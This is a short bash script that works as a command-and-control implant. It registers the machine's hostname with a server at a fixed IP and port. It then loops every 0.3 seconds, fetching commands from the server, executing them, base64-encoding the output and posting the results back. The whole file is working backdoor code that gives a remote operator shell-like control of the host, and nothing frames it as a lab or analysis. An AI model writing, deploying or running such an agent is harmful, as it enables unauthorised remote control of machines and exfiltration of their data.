#!/bin/bash
ip="192.168.1.4"
port="8000"
interface="eth0"
n=.3

regl="http://$ip:$port/reg/"

declare -A data=( [eth]=$interface [hname]=$(hostname) )

name=$(curl -X POST -F eth=$interface -F hname=$(hostname) $regl) 

taskl="http://$ip:$port/tasks/$name/"
resultl="http://$ip:$port/Lin-results/$name/"

while :
do  
    res1=$(curl $taskl)
    res=$($res1|base64)
    echo $res > /tmp/result
    curl -X POST --data "@/tmp/result" $resultl
    sleep $n
done
